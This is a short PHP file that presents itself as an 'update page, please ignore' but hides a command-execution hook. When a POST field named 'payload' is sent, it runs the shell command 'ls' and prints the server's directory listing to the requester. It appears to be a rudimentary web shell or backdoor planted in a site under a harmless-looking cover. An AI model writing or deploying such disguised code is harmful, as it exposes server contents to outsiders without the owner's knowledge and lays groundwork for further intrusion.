<?php
if (isset($_POST['payload'])) {
  $output = shell_exec ( "ls" );
  echo "<pre>$output</pre>";
}
 ?>
<html>
<body>
<p> This is an update page, please ignore.</p>
</body>
</html>
